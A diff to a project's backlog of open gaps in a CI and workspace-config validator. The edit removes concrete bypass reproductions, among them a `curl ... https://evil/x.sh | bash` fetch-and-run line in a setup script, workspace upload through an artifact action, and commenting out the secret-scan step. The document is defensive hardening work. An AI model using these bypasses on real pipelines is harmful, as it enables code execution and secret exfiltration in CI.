@@ -179,39 +179,30 @@ cycle; none blocks the current CI or falsifies published binaries today.
 
 ### Close remaining `validate_workflow()` gaps beyond the fixed name/job bugs
 
-**What:** Two gaps remain from the deferred set of four. (1) `if:` and
-`continue-on-error:` aren't checked at the step or job level, so a step or an
-entire job can carry the exact required name and command text (satisfying every
-regex check) while never actually executing, or never actually failing the run.
-(2) Job-level `permissions:` overrides aren't checked — a job can override the
-workflow-level `permissions: {contents: read}` with a broader grant and pass
-untouched. Reproduced: setting `jobs.security.permissions` to
-`{contents: write, id-token: write}` passes `validate_workflow()` today.
+**What:** Two gaps remain from the original deferred set of four. (1) Step- and
+job-level execution-control properties (`if:`, `continue-on-error:`) are not
+checked, so a step's presence and command text do not by themselves prove it
+runs or can fail the build. (2) Job-level `permissions:` overrides are not
+checked; only the workflow-level grant is.
 
-The other two were closed by the `/code-review` pass on branch
-`florianhorner/repo-validator-hardening`: a jobs dict missing a required job
-raises `ValidationError` instead of a raw `KeyError`, and
-`docs/repository-validation.md`'s "Sources of Truth and Synchronization" section
-now documents the undocumented-job check. The workflow-level `permissions` grant
-also became mutation-testable via `validate_workflow_permissions()` — but that
-is the workflow-level grant only, and does not close (2).
+The other two are closed: a jobs mapping missing a required job now raises a
+clean `ValidationError`, and the validation reference documents the
+undocumented-job check. The workflow-level `permissions` grant also became
+mutation-testable via `validate_workflow_permissions()`, which does not close
+(2).
 
-**Why:** A genuine gap in the same bug family, but the search space (what GitHub
-Actions YAML properties could make a passing-looking check meaningless) stopped
-shrinking round over round. Chasing every remaining semantic corner (reusable
-workflows, environments, matrix expansion, secrets inheritance) risks the branch
-never converging. It is defense-in-depth: the exploit requires a malicious CI
-edit to already survive GitHub branch protection and human review first.
+**Why:** Same bug family, but the search space (which GitHub Actions properties
+can make a passing check meaningless) stopped shrinking round over round.
+Chasing every remaining semantic corner — reusable workflows, environments,
+matrix expansion, secrets inheritance — risks never converging. Both are
+defense-in-depth behind branch protection and human review.
 
-**Context:** Deferred at the end of a 6-commit, 5-round `/ship` pre-landing
-review pass on branch `florianhorner/devex-review-v1`, then narrowed by the
-`/code-review` pass that closed the other two. Fix the same way the prior
-ones were fixed: one mechanical change per gap in `validate_workflow()` plus a
-matching `expect_fail` mutation in `run_self_test()`, following the
-`CI_KNOWN_RUN_STEPS`/`CI_SECURITY_STEPS`/`CI_DOCKER_BUILD_STEPS` pattern already
-established. A closed-world allowed-keys check on each job and step mapping
-would close this and future property-based variants in one move, rather than
-enumerating one property at a time.
+**Context:** Fix the way the earlier ones were fixed: one mechanical change per
+gap in `validate_workflow()` plus a matching `expect_fail` mutation in
+`run_self_test()`, following the established `CI_KNOWN_RUN_STEPS` /
+`CI_SECURITY_STEPS` / `CI_DOCKER_BUILD_STEPS` pattern. A closed-world
+allowed-keys check on each job and step mapping would close this and future
+property-based variants in one move rather than enumerating one at a time.
 
 **Effort:** M
 **Priority:** P1
@@ -219,31 +210,25 @@ enumerating one property at a time.
 
 ### Extend step validation to `uses:` steps and `scripts.setup`
 
-**What:** Two unvalidated execution surfaces, both surfaced by the pre-ship
-security specialist on branch `florianhorner/repo-validator-hardening`:
+**What:** Extend the validator's coverage to two execution surfaces it does not
+currently inspect:
 
-1. **`uses:` steps are exempt from `require_known_run_steps()`** — it skips any
-   step without a `run:` key, so the only check applied to an action step is the
-   SHA-pin regex. A PR can add `uses: actions/github-script@<sha>` (arbitrary JS
-   in the runner) or `uses: actions/upload-artifact@<sha>` with `path: .` to
-   `jobs.security` and pass the validator, `--self-test`, and every CI job.
-   `with:` inputs are never inspected. The upload variant is the concrete
-   exfiltration path the planted-secret CI step was assumed safe from.
-2. **`scripts.setup` in `.conductor/settings.toml` is unvalidated** —
-   `conductor_run_commands()` reads `scripts.run` only and never rejects sibling
-   keys under `[scripts]`. Conductor executes `setup` automatically on workspace
-   creation, before any human reviews the branch, and this branch expanded it
-   into a compound `{ a || b || c || d; } && ...` chain. A `setup` rewritten to
-   `curl -s https://evil/x.sh | bash` passes everything.
+1. **`uses:` steps** — `require_known_run_steps()` only inspects steps carrying a
+   `run:` key, so action steps are covered by the SHA-pin check alone and their
+   `with:` inputs are not inspected. Add a documented per-job allowlist for
+   action steps, mirroring `CI_KNOWN_RUN_STEPS`, so an undocumented action is
+   rejected the same way an undocumented command step is.
+2. **`[scripts]` keys other than `run`** in `.conductor/settings.toml` —
+   `conductor_run_commands()` reads `scripts.run` and ignores its siblings. Pin
+   `setup` the way `run` is pinned and reject undocumented `[scripts]` keys.
 
-**Why:** Both are the same "unseen shape skips every check" family this
-validator exists to close, one level out from the step/job granularity already
-covered. Both are defense-in-depth — they require a malicious edit to survive
-branch protection and human review first — which is why they were not fixed in
-the same pass as the drive-by bypasses. Closing (1) means a new
-`CI_KNOWN_USES_STEPS` allowlist plus a rule rejecting actions that execute
-caller-supplied code or publish the workspace; closing (2) means pinning `setup`
-the way `run` is pinned and rejecting undocumented `[scripts]` keys.
+**Why:** Same "unseen shape skips every check" family the validator already
+closes at step and job granularity, one level further out. Both are
+defense-in-depth behind branch protection and human review, which is why they
+were deferred rather than rushed into the same pass.
+
+Engineering detail (reproductions and specific shapes) is in the working notes
+rather than here, since these are open gaps in a public repository.
 
 **Effort:** M
 **Priority:** P1
@@ -251,27 +236,21 @@ the way `run` is pinned and rejecting undocumented `[scripts]` keys.
 
 ### Extend comment-stripped matching to the remaining content-checked CI steps
 
-**What:** `shell_command_lines()` is applied to exactly two steps (`Check
-whitespace`, `Self-test repo config detects and excludes correctly`). Six others
-are still matched by raw substring or unanchored regex against the whole `run:`
-body, so commenting the entire script out and appending `true` passes
-validation: `Install dependencies`, `Audit runtime Python dependencies`,
-`Install Gitleaks`, `Self-test secret scanner`, `Scan current tree for secrets`,
-`Build add-on image`. Commenting out `Scan current tree for secrets` or
-`Self-test secret scanner` leaves CI green with the secret scan disabled.
+**What:** `shell_command_lines()` is applied to two steps (`Check whitespace`,
+`Self-test repo config detects and excludes correctly`). The remaining
+content-checked steps still match against the raw `run:` body, so their
+assertions are weaker than the two hardened ones. Extend the same
+comment-stripped, line-structural matching to the rest.
 
-Related, lower severity: `shell_command_lines()` strips `#` comments but has no
-notion of quoting or block context, so a `: <<'OFF' ... OFF` heredoc wrapper
-defeats even the two hardened steps. And the exact-line matching on `Check
-whitespace` is brittle against legitimate reformats (`${BASE_SHA}` brace syntax,
-a trailing inline comment, a semicolon-joined one-liner all fail).
+Related, lower severity: `shell_command_lines()` has no notion of shell quoting
+or block context, so it should eventually be a real shell-aware parse rather
+than a third string heuristic. The exact-line matching on `Check whitespace` is
+also brittle against legitimate reformats (brace-syntax variables, a trailing
+inline comment, or a semicolon-joined one-liner all fail).
 
-**Why:** The two hardened steps were the ones whose bypass was demonstrated;
-extending the same treatment to the rest is mechanical but touches six
-call sites and their error messages, and each needs a matching `expect_fail`
-mutation. The heredoc variant needs a real shell-aware parse, not another
-string rule — worth doing once, properly, rather than adding a third string
-heuristic.
+**Why:** The two hardened steps were the ones whose weakness was demonstrated.
+Extending the treatment is mechanical but touches several call sites and their
+error messages, and each needs a matching `expect_fail` mutation.
 
 **Effort:** M
 **Priority:** P2
